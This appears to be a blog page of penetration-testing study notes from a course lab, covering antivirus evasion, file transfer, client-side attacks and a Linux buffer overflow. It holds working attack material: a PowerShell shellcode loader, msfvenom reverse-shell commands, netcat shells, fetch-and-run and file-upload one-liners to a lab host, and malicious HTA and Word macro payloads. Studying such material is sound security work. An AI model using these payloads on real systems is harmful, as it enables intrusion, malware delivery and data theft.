<p>If this setting is enabled, we could craft an MSI file and run it to elevate our privileges</p>
<p>Linux:<br>find suid-marked binaries, the binary will be executed with the file owner’s permission</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/24/Study-Notes-2021-03-24/">Study Notes - 2021/03/24</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-23</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Antivirus-Evasion"><a href="#Antivirus-Evasion" class="headerlink" title="Antivirus Evasion"></a>Antivirus Evasion</h1><p>First generate a reverse shell:<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe &gt; binary.exe  </p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/#/home/upload">https://www.virustotal.com/#/home/upload</a>  </p>
<h1 id="Detection-Method"><a href="#Detection-Method" class="headerlink" title="Detection Method"></a>Detection Method</h1><h2 id="Signiture-based"><a href="#Signiture-based" class="headerlink" title="Signiture-based"></a>Signiture-based</h2><p>blacklist technology<br>a cotinuous series of bytes that uniquely identify it -&gt; change or obfuscating the content </p>
<h2 id="Heuristic-and-Behavioral-Based-Detection"><a href="#Heuristic-and-Behavioral-Based-Detection" class="headerlink" title="Heuristic and Behavioral-Based Detection"></a>Heuristic and Behavioral-Based Detection</h2><p>Heuristic-Based Detection is a detection method that relies on various rules and algorithms to determine whether or not an action is considered malicious</p>
<p>Behavioral-Based: This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, and looking for behaviors or actions that are considered malicious.</p>
<h1 id="Bypassing"><a href="#Bypassing" class="headerlink" title="Bypassing"></a>Bypassing</h1><h2 id="On-disk-evasion"><a href="#On-disk-evasion" class="headerlink" title="On-disk evasion"></a>On-disk evasion</h2><p>Packers, smaller, functional equivalent -&gt; new signiture, bypass older antivirus detection  </p>
<h3 id="Obfuscator"><a href="#Obfuscator" class="headerlink" title="Obfuscator"></a>Obfuscator</h3><p>Re-organize and mutate code, more difficult to reverse engineer , dead code</p>
<h3 id="Cypters"><a href="#Cypters" class="headerlink" title="Cypters"></a>Cypters</h3><p>Add a decryption step, in memory decryotion, invisible to malware detection</p>
<p>virtualmachine emulation detection, detect if it is executed in a virtual machine envrionment  </p>
<h3 id="Software-Protectors"><a href="#Software-Protectors" class="headerlink" title="Software Protectors"></a>Software Protectors</h3><h2 id="in-memory-evasion"><a href="#in-memory-evasion" class="headerlink" title="in-memory evasion"></a>in-memory evasion</h2><p>PE injection, manipulation of its own memory, does not write any thing to disk  </p>
<h3 id="Remote-Process-Memory-Injection"><a href="#Remote-Process-Memory-Injection" class="headerlink" title="Remote Process Memory Injection"></a>Remote Process Memory Injection</h3><h3 id="Reflective-DLL-injection"><a href="#Reflective-DLL-injection" class="headerlink" title="Reflective DLL injection"></a>Reflective DLL injection</h3><p>write their own version of api to load in memory dll  </p>
<h3 id="Process-Hollowing"><a href="#Process-Hollowing" class="headerlink" title="Process Hollowing"></a>Process Hollowing</h3><p>suspend a benign process, then image changed, resume executon </p>
<h3 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h3><p>modify memory, inject a hook, handler, to malicious code  </p>
<h1 id="Practical-example"><a href="#Practical-example" class="headerlink" title="Practical example"></a>Practical example</h1><p>Target a specific anti-virus product </p>
<h1 id="in-memory-injection"><a href="#in-memory-injection" class="headerlink" title="in-memory injection"></a>in-memory injection</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$code &#x3D; &#39;</span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint</span><br><span class="line">flAllocationType, uint flProtect);</span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,</span><br><span class="line">IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="line">[DllImport(&quot;msvcrt.dll&quot;)]</span><br><span class="line">public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;;</span><br><span class="line">$winFunc &#x3D;</span><br><span class="line">Add-Type -memberDefinition $code -Name &quot;Win32&quot; -namespace Win32Functions -passthru;</span><br><span class="line">[Byte[]];</span><br><span class="line">[Byte[]]$sc &#x3D; &lt;place your shellcode here&gt;;</span><br><span class="line">$size &#x3D; 0x1000;</span><br><span class="line">if ($sc.Length -gt 0x1000) &#123;$size &#x3D; $sc.Length&#125;;</span><br><span class="line">$x &#x3D; $winFunc::VirtualAlloc(0,$size,0x3000,0x40);</span><br><span class="line">for ($i&#x3D;0;$i -le ($sc.Length-1);$i++) &#123;$winFunc::memset([IntPtr]($x.ToInt32()+$i),</span><br><span class="line">$sc[$i], 1)&#125;;</span><br><span class="line">$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) &#123; Start-sleep 60 &#125;;</span><br></pre></td></tr></table></figure>

<p>use load code into the memory, then execute with create thread. in powershell script </p>
<p>prevent from execution:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\offsec\Desktop&gt; powershell .\av_test.ps1</span><br><span class="line">.\av_test.ps1 : File C:\Users\offsec\Desktop\av_test.ps1 cannot be loaded because</span><br><span class="line">running scripts is disabled on this</span><br><span class="line">system. For more information, see about_Execution_Policies at</span><br><span class="line">http:&#x2F;&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ .\av_test.ps1</span><br><span class="line">+ ~~~~~~~~~~~~~</span><br><span class="line">+ CategoryInfo : SecurityError: (:) [], PSSecurityException</span><br><span class="line">+ FullyQualifiedErrorId : UnauthorizedAccess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\offsec\Desktop&gt; powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br><span class="line">PS C:\Users\offsec\Desktop&gt; Get-ExecutionPolicy -Scope CurrentUser</span><br><span class="line">Undefined</span><br><span class="line">PS C:\Users\offsec\Desktop&gt; Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope</span><br><span class="line">CurrentUser</span><br><span class="line">PS C:\Users\offsec\Desktop&gt; Get-ExecutionPolicy -Scope CurrentUser</span><br><span class="line">Unrestricted</span><br></pre></td></tr></table></figure>

<h1 id="Shelter"><a href="#Shelter" class="headerlink" title="Shelter"></a>Shelter</h1><p>stealth mode: restore the execution of original flow after finish the injected code  </p>
<p>Session died after original code exit </p>
<p>we can set up an AutoRunScript to migrate our Meterpreter to a separate process immediately after session creation</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set AutoRunScript post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/23/Study-Notes-2021-03-22/">Study Notes - 2021/03/22</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-22</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Fixing-Memory-Corruption-Exploits"><a href="#Fixing-Memory-Corruption-Exploits" class="headerlink" title="Fixing Memory Corruption Exploits"></a>Fixing Memory Corruption Exploits</h1><p>searchsploit -m 42341<br>copy the exploit   </p>
<h1 id="Cross-Cpmpiling-the-Exploit-Code"><a href="#Cross-Cpmpiling-the-Exploit-Code" class="headerlink" title="Cross-Cpmpiling the Exploit Code"></a>Cross-Cpmpiling the Exploit Code</h1><p>mingw-64 a cross-compiler<br>sudo apt install mingw-w64  </p>
<h1 id="Changing-the-Socket-Information"><a href="#Changing-the-Socket-Information" class="headerlink" title="Changing the Socket Information"></a>Changing the Socket Information</h1><h1 id="Change-the-payload"><a href="#Change-the-payload" class="headerlink" title="Change the payload"></a>Change the payload</h1><h1 id="Fix-Web-Exploits"><a href="#Fix-Web-Exploits" class="headerlink" title="Fix Web Exploits"></a>Fix Web Exploits</h1><p>make sure the certificate is ignored if face certificate check failed<br>python request The official documentation394 indicates that the SSL certificate will be ignored if we set the verify<br>parameter to False  </p>
<h1 id="File-Transfers"><a href="#File-Transfers" class="headerlink" title="File Transfers"></a>File Transfers</h1><h1 id="non-interactive-shell"><a href="#non-interactive-shell" class="headerlink" title="non-interactive shell"></a>non-interactive shell</h1><p>on client, we open a listening shell: nc -nvlp 4444 -e /bin/bash<br>in attack machine, connect to it nc -nv xxx.xx.xx.xxx 4444<br>if we run ftp, we lose the interaction, input not binded correctly  </p>
<h1 id="upgrading-the-non-interactive-shell"><a href="#upgrading-the-non-interactive-shell" class="headerlink" title="upgrading the non-interactive shell"></a>upgrading the non-interactive shell</h1><p>nc -nvlp 4444 -e /bin/bash<br>nc -nv 192.168.148.44 4444  </p>
<p>python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>get a bash prompt, get the pty shell, good  </p>
<h1 id="Transfer-file-with-windows-hosts"><a href="#Transfer-file-with-windows-hosts" class="headerlink" title="Transfer file with windows hosts"></a>Transfer file with windows hosts</h1><p>Non-interative ftp download<br>sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/  </p>
<p>home directory of ftp is set to /ftphome/  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\offsec&gt;echo open 10.11.0.4 21&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo USER offsec&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo lab&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo bin &gt;&gt; ftp.txt  # request a binary file transfer</span><br><span class="line">C:\Users\offsec&gt;echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo bye &gt;&gt; ftp.txt</span><br><span class="line"></span><br><span class="line">ftp -v -n -s:ftp.txt</span><br></pre></td></tr></table></figure>
<p>-v to suppress any returned output, -n to suppresses automatic<br>login, and -s to indicate the name of our command file.  </p>
<h1 id="Windows-Downloads-using-scripting-languages"><a href="#Windows-Downloads-using-scripting-languages" class="headerlink" title="Windows Downloads using scripting languages"></a>Windows Downloads using scripting languages</h1><p>Use vb script</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl &#x3D; WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile &#x3D; WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT &#x3D; 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG &#x3D; 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRECT &#x3D; 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY &#x3D; 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http &#x3D; Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt;</span><br><span class="line">wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt;</span><br><span class="line">wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;, strURL, False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArray &#x3D; http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line">echo Set http &#x3D; Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts &#x3D; fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs</span><br><span class="line">echo strData &#x3D; &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo strBuffer &#x3D; &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter &#x3D; 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close &gt;&gt; wget.vbs</span><br></pre></td></tr></table></figure>

<p>C:\Users\Offsec&gt; cscript wget.vbs <a target="_blank" rel="noopener" href="http://10.11.0.4/evil.exe">http://10.11.0.4/evil.exe</a> evil.exe  </p>
<p>Use powershell :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; echo $webclient &#x3D; New-Object System.Net.WebClient &gt;&gt;wget.ps1</span><br><span class="line">C:\Users\Offsec&gt; echo $url &#x3D; &quot;http:&#x2F;&#x2F;10.11.0.4&#x2F;evil.exe&quot; &gt;&gt;wget.ps1</span><br><span class="line">C:\Users\Offsec&gt; echo $file &#x3D; &quot;new-exploit.exe&quot; &gt;&gt;wget.ps1</span><br><span class="line">C:\Users\Offsec&gt; echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -</span><br><span class="line">NoProfile -File wget.ps1</span><br></pre></td></tr></table></figure>

<p>First, we must allow execution of PowerShell scripts (which is restricted by default) with the -<br>ExecutionPolicy keyword and Bypass value. Next, we will use -NoLogo and -NonInteractive<br>to hide the PowerShell logo banner and suppress the interactive PowerShell prompt, respectively.<br>The -NoProfile keyword will prevent PowerShell from loading the default profile (which is not<br>needed), and finally we specify the script file with -File: </p>
<p>one line version </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;10.11.0.4&#x2F;evil.exe&#39;, &#39;new-exploit.exe&#39;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.11.0.4&#x2F;helloworld.ps1&#39;)</span><br></pre></td></tr></table></figure>
<p>download and execute without save to disk  </p>
<h1 id="Download-with-exe2hex-and-powershell"><a href="#Download-with-exe2hex-and-powershell" class="headerlink" title="Download with exe2hex and powershell"></a>Download with exe2hex and powershell</h1><p><code>upx -9 nc.exe</code> compress the binary file<br><code>exe2hex -x nc.exe -p nc.cmd  </code>  </p>
<p>pipling the file into clipboard:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat nc.cmd | xclip -selection clipboard</span><br></pre></td></tr></table></figure>

<p>oaste it into the non-interactive shell  </p>
<h1 id="windows-upload-using-windows-scripting-language"><a href="#windows-upload-using-windows-scripting-language" class="headerlink" title="windows upload using windows scripting language"></a>windows upload using windows scripting language</h1><p>host a upload http server  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$uploaddir &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;uploads&#x2F;&#39;;</span><br><span class="line">$uploadfile &#x3D; $uploaddir . $_FILES[&#39;file&#39;][&#39;name&#39;];</span><br><span class="line">move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>sudo mkdir /var/www/uploads<br>sudo chown www-data: /var/www/uploads   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (New-Object System.Net.WebClient).UploadFile(&#39;http:&#x2F;&#x2F;10.11.0.4&#x2F;upload.php&#39;, &#39;important.docx&#39;)</span><br></pre></td></tr></table></figure>

<h1 id="Uploading-Files-with-TFTP"><a href="#Uploading-Files-with-TFTP" class="headerlink" title="Uploading Files with TFTP"></a>Uploading Files with TFTP</h1><p>xp, 2003  </p>
<p>sudo chown nobody: /tftp<br>sudo atftpd –daemon –port 69 /tftp    </p>
<p>in windows:<br>tftp -i 10.11.0.4 put important.docx  </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/21/Study-Notes-2021-03-21/">Study Notes - 2021/03/21</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-21</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Client-side-Attack"><a href="#Client-side-Attack" class="headerlink" title="Client-side Attack"></a>Client-side Attack</h1><h2 id="Passive-Client-information-Gathering"><a href="#Passive-Client-information-Gathering" class="headerlink" title="Passive Client information Gathering"></a>Passive Client information Gathering</h2><p>Googled for various known external corporate IP addresses and found one on a site that hosts collected user agent data from various affiliate sites.</p>
<h2 id="Active-Client-information-Gathering"><a href="#Active-Client-information-Gathering" class="headerlink" title="Active Client information Gathering"></a>Active Client information Gathering</h2><h2 id="Social-engineering-and-client-side-attacks"><a href="#Social-engineering-and-client-side-attacks" class="headerlink" title="Social engineering and client-side attacks"></a>Social engineering and client-side attacks</h2><p>Cheat HR, by sending their a document, and ask what types of os and broseswer they are using </p>
<h2 id="Client-Fingerprinting"><a href="#Client-Fingerprinting" class="headerlink" title="Client Fingerprinting"></a>Client Fingerprinting</h2><p>fingerpringjs  </p>
<p>use ajax to post components array to the server  </p>
<p>sudo chown www-data:www-data fp  </p>
<h2 id="Leveraging-HTML-Applications"><a href="#Leveraging-HTML-Applications" class="headerlink" title="Leveraging HTML Applications"></a>Leveraging HTML Applications</h2><p>If a file is created with the extension of .hta instead of .html, Internet Explorer will automatically nterpret it as a HTML Application and offer the ability to execute it using the mshta.exe program.</p>
<p>work with IE </p>
<p>Similar to an HTML page, a typical HTML Application includes html, body, and script tags followed by JavaScript or VBScript code. However, since the HTML Application is executed outside the browser we are free to use legacy and dangerous features that are often blocked within the browser  </p>
<p>An additional window will open, add close </p>
<p>``</p>
<html>
<head>
<script>
var c= 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>
self.close();
</script>
</body>
</html>
``

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.119.148 LPORT&#x3D;4444 -f hta-psh -o &#x2F;var&#x2F;www&#x2F;html&#x2F;evil.hta</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iKqr8BWFyuiK.Run &quot;powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg</span><br></pre></td></tr></table></figure>

<p>-nop no profile<br>-w hidden do not pop up a window<br>-EncodedCommand  -e  </p>
<h1 id="Microsoft-macros"><a href="#Microsoft-macros" class="headerlink" title="Microsoft macros"></a>Microsoft macros</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">MyMacro</span><br><span class="line">End Sub</span><br><span class="line">Sub Document_Open()</span><br><span class="line">MyMacro</span><br><span class="line">End Sub</span><br><span class="line">Sub MyMacro()</span><br><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run &quot;cmd&quot;</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<p>We must save the containing document as either .docm or the older .doc format, which supports<br>embedded macros, but must avoid the .docx format, which does not support them.</p>
<h1 id="Object-Linking-and-Emedding"><a href="#Object-Linking-and-Emedding" class="headerlink" title="Object Linking and Emedding"></a>Object Linking and Emedding</h1><p>Insert batch object into a word file<br>change the present, display as icon, change the icon<br>Can also change caption<br>user need to click on the icon to lanuch the batch file  </p>
<p>START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj….  </p>
<h1 id="Evading-Protected-View"><a href="#Evading-Protected-View" class="headerlink" title="Evading Protected View"></a>Evading Protected View</h1><p>block the execution of macro and embeded object<br>bypass is to use another Office application.  </p>
<h1 id="Locating-public-exploits"><a href="#Locating-public-exploits" class="headerlink" title="Locating public exploits"></a>Locating public exploits</h1><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com</a>  </p>
<p><a target="_blank" rel="noopener" href="https://www.securityfocus.com/">https://www.securityfocus.com</a><br>A vulnerability database instead of exploit database, reference may contain some PoC </p>
<p><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/">https://packetstormsecurity.com</a><br>It provides up-to-date information on security news and vulnerabilities as well as recently published tools by security vendors</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox --search &quot;Microsoft Edge site:exploit-db.com&quot;</span><br></pre></td></tr></table></figure>
<p>inurl intext and intitle  </p>
<h1 id="Offline-exploit-resource"><a href="#Offline-exploit-resource" class="headerlink" title="Offline exploit resource"></a>Offline exploit resource</h1><p>SearchSploit  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install exploitdb</span><br></pre></td></tr></table></figure>
<p>to make sure it is lateset  </p>
<p>/usr/share/exploitdb/exploits/  </p>
<h1 id="nmap-NSE-script"><a href="#nmap-NSE-script" class="headerlink" title="nmap NSE script"></a>nmap NSE script</h1><p>kali@kali:~$ cd /usr/share/nmap/scripts<br>kali@kali:/usr/share/nmap/scripts$ grep Exploits *.nse<br>nmap –script-help=clamav-exec.nse  </p>
<h1 id="The-Browser-Exploitation-Framework-BeEF"><a href="#The-Browser-Exploitation-Framework-BeEF" class="headerlink" title="The Browser Exploitation Framework (BeEF)"></a>The Browser Exploitation Framework (BeEF)</h1><h1 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a>Metasploit Framework</h1><h1 id="Put-all-together"><a href="#Put-all-together" class="headerlink" title="Put all together"></a>Put all together</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.11.0.128 -p- -sV -vv --open --reason</span><br></pre></td></tr></table></figure>
<p>  –open: Only show open (or possibly open) ports<br>  –reason: Display the reason a port is in a particular state  </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/21/Study-Notes-2021-03-20/">Study Notes - 2021/03/20</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-20</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Linux-Buffer-Overflow"><a href="#Linux-Buffer-Overflow" class="headerlink" title="Linux Buffer Overflow"></a>Linux Buffer Overflow</h1><h2 id="DEP-data-execution-prevention-ASLR-Canaries"><a href="#DEP-data-execution-prevention-ASLR-Canaries" class="headerlink" title="DEP (data execution prevention), ASLR, Canaries"></a>DEP (data execution prevention), ASLR, Canaries</h2><h1 id="replicating-the-crash"><a href="#replicating-the-crash" class="headerlink" title="replicating the crash"></a>replicating the crash</h1><h1 id="controlling-EIP"><a href="#controlling-EIP" class="headerlink" title="controlling EIP"></a>controlling EIP</h1><h2 id="find-the-eip-location-use-msf-pattern-create"><a href="#find-the-eip-location-use-msf-pattern-create" class="headerlink" title="find the eip location, use msf-pattern_create"></a>find the eip location, use msf-pattern_create</h2><p><code>msf-pattern_create -l 4379</code><br>eip = 0x46367046<br><code>msf-pattern_offset -q 46367046</code><br>-q, –query Aa0A                 Query to Locate  </p>
<p>offset = 4368</p>
<p>crash = “\x41” * 4368 + “B” * 4 + “C” * 7  </p>
<h2 id="locating-space-for-shell-code"><a href="#locating-space-for-shell-code" class="headerlink" title="locating space for shell code"></a>locating space for shell code</h2><p>find a register that point to our buffer:<br>esp point to the end of our buffer, only have 7 bytes remaining in the buffer, increase buffer size not work, lead to another crash<br>eax point to the start of the buffer, including the “setup sound” string </p>
<p>right click -&gt; go to expression (setup sound)<br>“se” -&gt;  translate to <code>jae</code> jump short if above or equal<br>“tu” -&gt;  <code>je</code> jump if equal<br>not good  </p>
<p>insert first stage shell code at the 7 bytes space<br>use to allain eax to point to string after setup sound, then jump to there </p>
<p>increase eax+12 as there are 12 chars in “setup sound”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ msf-nasm_shell</span><br><span class="line">nasm &gt; add eax,12</span><br><span class="line">00000000 83C00C add eax,byte +0xc</span><br><span class="line">nasm &gt; jmp eax</span><br><span class="line">00000000 FFE0 jmp eax</span><br></pre></td></tr></table></figure>

<p>5 bytes instructions 83C00C FFE0</p>
